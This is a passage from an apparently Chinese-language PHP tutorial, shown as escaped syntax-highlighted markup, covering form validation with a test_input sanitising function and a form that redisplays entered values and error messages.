            &lt;span class=&#34;token variable&#34;&gt;$websiteErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;非法的 URL 的地址&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
        &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;comment&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$comment&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$comment&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;comment&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    
    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;gender&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$genderErr&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;性别是必需的&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;test_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;gender&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;test_input&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;trim&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$data&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;PHP 表单验证实例&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;h2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;* 必需字段。&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;p&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;post&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;htmlspecialchars&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;PHP_SELF&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt; 
   名字: &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;* &lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$nameErr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   E-mail: &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;email&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$email&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;* &lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$emailErr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   网址: &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;website&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$website&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;span&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;error&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$websiteErr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;span&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   备注: &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;textarea&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;comment&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rows&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;5&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;cols&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;40&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$comment&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;textarea&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;br&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
   性别:
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;radio&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;gender&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;female&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;checked&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;  &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;female&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;女
   &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;radio&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;gender&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$gender&lt;/span&gt;&lt;span class=&#34;token 